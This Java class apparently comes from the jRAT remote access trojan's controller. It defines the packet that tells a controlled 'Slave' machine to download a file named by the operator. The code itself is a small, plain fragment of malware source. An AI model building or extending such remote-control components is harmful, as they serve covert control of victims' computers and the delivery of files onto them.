package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet21ServerDownloadFile extends AbstractOutgoingPacket {

	private String file;

	public Packet21ServerDownloadFile(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		System.out.println(file);
		slave.writeLine(file);
	}

	@Override
	public byte getPacketId() {
		return 21;
	}

}
